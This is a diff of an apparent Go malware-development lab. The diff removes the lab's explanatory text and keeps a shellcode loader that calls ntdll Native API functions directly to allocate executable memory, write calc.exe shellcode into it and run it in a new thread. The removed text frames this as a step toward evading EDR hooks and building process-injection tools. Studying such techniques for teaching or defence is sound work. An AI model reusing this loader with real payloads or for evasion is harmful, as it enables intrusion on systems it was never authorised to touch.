@@ -1,26 +1,3 @@
----
-showTableOfContents: true
-title: "Calling Native API Functions via Syscall Package (Lab 11.2)"
-type: "page"
----
-## Goal
-In Theory 11.3, we learned that calling Native API functions often requires bypassing standard Go wrappers and using the `syscall` package directly, specifically `syscall.SyscallN`. This involves obtaining the function's address (as demonstrated in our previous function lookup lab), understanding its signature, carefully preparing arguments as `uintptr` values (often using `unsafe.Pointer`), and meticulously checking the `NTSTATUS` return value for success.
-
-In this lab we'll put these concepts into practice to construct a simple loader that will inject and execute our calc.exe shellcode within  its own process space using solely Native API functions. Specifically, we'll:
-
-1. Dynamically find the addresses of `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`, `NtWaitForSingleObject`, `NtClose`, and `NtFreeVirtualMemory` within `ntdll.dll`.
-2. Call `NtAllocateVirtualMemory` via `syscall.SyscallN` to allocate a memory region with `PAGE_EXECUTE_READWRITE` permissions.
-3. Utilize `NtWriteVirtualMemory` via `syscall.SyscallN` to copy our `calc.exe` shellcode into this allocated buffer.
-4. Execute the shellcode by calling `NtCreateThreadEx` via `syscall.SyscallN`, pointing it to our shellcode's memory location.
-5. Ensure proper execution flow and cleanup by calling `NtWaitForSingleObject` to wait for the shellcode thread to complete, followed by `NtClose` to close the thread handle.
-6. Verify that each NTAPI call succeeds by checking the `NTSTATUS` return code, logging detailed error information if any step fails.
-7. Finally, clean up the allocated memory using `NtFreeVirtualMemory` via `syscall.SyscallN` to release the resources back to the system.
-
-This lab demonstrates the direct use of NTAPI for core process injection steps: memory allocation, writing to process memory, and thread creation, all while managing resources and checking for errors at each stage.
-
-## Code
-
-```go
 //go:build windows
 // +build windows
 
@@ -28,12 +5,10 @@ package main
 
 import (
 	"fmt"
+	"golang.org/x/sys/windows"
 	"log"
-	"unsafe" // Required for unsafe.Pointer
-	// "os"     // For os.Exit - Not strictly needed here if we log.Fatal
-
-	"golang.org/x/sys/windows" // For constants and some Windows types
-	"syscall"                  // For SyscallN
+	"syscall"
+	"unsafe"
 )
 
 // Shellcode to launch calc.exe (x64)
@@ -60,7 +35,7 @@ func main() {
 		"NtCreateThreadEx",
 		"NtWaitForSingleObject",
 		"NtFreeVirtualMemory",
-		"NtClose", // To close the thread handle
+		"NtClose",
 	}
 
 	fmt.Println("[*] Getting handle to ntdll.dll...")
@@ -69,8 +44,7 @@ func main() {
 	if err != nil {
 		log.Fatalf("[-] Failed to load ntdll.dll: %v", err)
 	}
-	// It's good practice to free the library handle when done,
-	// but for a simple loader that exits, it's less critical.
+
 	// For long-running applications, ensure FreeLibrary is called.
 	// defer windows.FreeLibrary(ntdllHandle) // Deferred if main function could return early before log.Fatal
 	fmt.Printf("[+] Got ntdll.dll handle: 0x%X\n", ntdllHandle)
@@ -95,7 +69,7 @@ func main() {
 	}
 
 	if !allFound {
-		windows.FreeLibrary(ntdllHandle) // Clean up before fatal exit
+		windows.FreeLibrary(ntdllHandle)
 		log.Fatalf("[-] Not all required NTAPI function addresses were found. Exiting.")
 	}
 	fmt.Println("[+] All required function addresses found.")
@@ -141,10 +115,10 @@ func main() {
 	// NumberOfBytesWritten: Pointer to SIZE_T, can be 0 (nil) if not needed to check.
 	ntStatus, _, sysCallErr = syscall.SyscallN(
 		funcAddrs["NtWriteVirtualMemory"],
-		uintptr(windows.CurrentProcess()),          // ProcessHandle
-		baseAddress,                                // BaseAddress
-		uintptr(unsafe.Pointer(&calcShellcode[0])), // Buffer
-		size, // NumberOfBytesToWrite
+		uintptr(windows.CurrentProcess()),              // ProcessHandle
+		baseAddress,                                    // BaseAddress
+		uintptr(unsafe.Pointer(&calcShellcode[0])),     // Buffer
+		size,                                           // NumberOfBytesToWrite
 		uintptr(unsafe.Pointer(&numberOfBytesWritten)), // *NumberOfBytesWritten (or uintptr(0) if not checking)
 	)
 
@@ -282,101 +256,3 @@ func main() {
 	windows.FreeLibrary(ntdllHandle) // Final cleanup of ntdll handle
 	fmt.Println("[+] Shellcode injection process complete.")
 }
-
-````
-
-## Code Breakdown
-**Shellcode and Constants**
-- `calcShellcode`: A byte slice containing the machine code to launch `calc.exe`.
-- `STATUS_SUCCESS`: Defined as `uintptr(0)`. This is the standard `NTSTATUS` value indicating a successful Native API call. All NTAPI functions used will return an `NTSTATUS`.
-- `targetFunctions`: A slice of strings listing the names of the NTAPI functions we need to resolve: `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`, `NtWaitForSingleObject`, `NtFreeVirtualMemory`, and `NtClose`.
-
-**Load `ntdll.dll` and Find Function Addresses:**
-- `windows.LoadLibrary("ntdll.dll")`: Gets a handle to `ntdll.dll`, which exports the Native API functions.
-- A loop iterates through `targetFunctions`: `windows.GetProcAddress(ntdllHandle, funcName)`: For each function name, its address in `ntdll.dll` is retrieved.
-
-
-**`syscall.SyscallN` is used to call our primary functions:**
-- `NtAllocateVirtualMemory` is used to allocate a memory region in the current process with `PAGE_EXECUTE_READWRITE` permissions.
-- `NtWriteVirtualMemory` is used to copy the `calcShellcode` into the memory region allocated in the previous step.
-- `NtCreateThreadEx` is used to create a new thread in the current process that starts execution at the beginning of our shellcode.
-- `NtWaitForSingleObject` is used to pause the main program's execution until the newly created thread (running the shellcode) finishes.
-- `NtClose` is used to close the handle to the thread, releasing system resources associated with it. This is done after the thread has terminated or is no longer needed.
-- `NtFreeVirtualMemory` is used to release the memory region previously allocated for the shellcode.
-
-**Cleanup `ntdll.dll` Handle:**
-- `windows.FreeLibrary(ntdllHandle)`is called to release the handle to `ntdll.dll`. This is done at the very end if all operations were successful, or before `log.Fatalf` if an unrecoverable error occurred after `ntdllHandle` was obtained.
-
-
-
-
-## Instructions
-
-Compile using `go build`.
-
-```shell
-GOOS=windows GOARCH=amd64 go build -buildvcs=false
-```
-
-In case it’s required, transfer the binary over to the target system, and run it.
-
-```shell
-.\native_loader.exe
-```
-
-
-## Results
-
-```shell
-PS C:\Users\vuilhond\Desktop> .\native_agent.exe
-[+] Native API Shellcode Loader
-[*] Getting handle to ntdll.dll...
-[+] Got ntdll.dll handle: 0x7FF99F190000
-[*] Finding function addresses...
-  [+] Found 'NtAllocateVirtualMemory' at address: 0x7FF99F22D7E0
-  [+] Found 'NtWriteVirtualMemory' at address: 0x7FF99F22DC20
-  [+] Found 'NtCreateThreadEx' at address: 0x7FF99F22ED10
-  [+] Found 'NtWaitForSingleObject' at address: 0x7FF99F22D560
-  [+] Found 'NtFreeVirtualMemory' at address: 0x7FF99F22D8A0
-  [+] Found 'NtClose' at address: 0x7FF99F22D6C0
-[+] All required function addresses found.
-[*] Allocating memory for shellcode...
-[+] Memory allocated at: 0x21568E60000, Size: 4096 bytes
-[*] Writing shellcode to allocated memory...
-[+] Shellcode (4096 bytes) written to memory. Bytes written: 4096
-[*] Creating a new thread to execute shellcode...
-[+] Thread created successfully with Handle: 0x17C. Shellcode should be executing (calc.exe).
-[*] Waiting for the thread to complete (calc.exe to be closed)...
-[+] Thread completed.
-[*] Closing thread handle...
-[+] Thread handle 0x17C closed.
-[*] Freeing allocated memory...
-[+] Memory (previously at 0x21568E60000) freed successfully.
-[+] Shellcode injection process complete.
-```
-
-- Additionally, `calc.exe` should also be launched
-
-
-## Discussion
-
-This lab successfully demonstrates the core mechanics of calling Native API functions like `NtAllocateVirtualMemory` and `NtWriteVirtualMemory` from Go using the `syscall` package. We saw the necessity of:
-
-- Finding the function addresses dynamically.
-- Carefully constructing the arguments as `uintptr` values, often requiring `unsafe.Pointer` to pass addresses of variables.
-- Checking the `NTSTATUS` returned by the Native API function itself.
-
-Compared to using the high-level WinAPI wrappers (like `windows.VirtualAlloc`), this approach requires significantly more manual effort and a precise understanding of the underlying function signatures. However, it grants us the ability to call functions directly in `ntdll.dll`, which is the first step towards bypassing user-mode hooks targeting `kernel32.dll`.
-
-## Conclusion
-
-We have now successfully called lower-level Native API functions for memory management directly from Go using `syscall.SyscallN`. This technique, while more complex than using standard wrappers, is essential for building more evasive tools. Having practiced this locally, we are now prepared to apply the same principles (`NtOpenProcess`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtProtectVirtualMemory`, `NtCreateThreadEx` all via `syscall.SyscallN`) to perform process injection in the next module without relying on the potentially hooked `kernel32.dll` functions.
-
-
-
-
-
----
-[|TOC|]({{< ref "../moc.md" >}})
-[|PREV|]({{< ref "calling.md" >}})
-[|NEXT|]({{< ref "calling.md" >}})
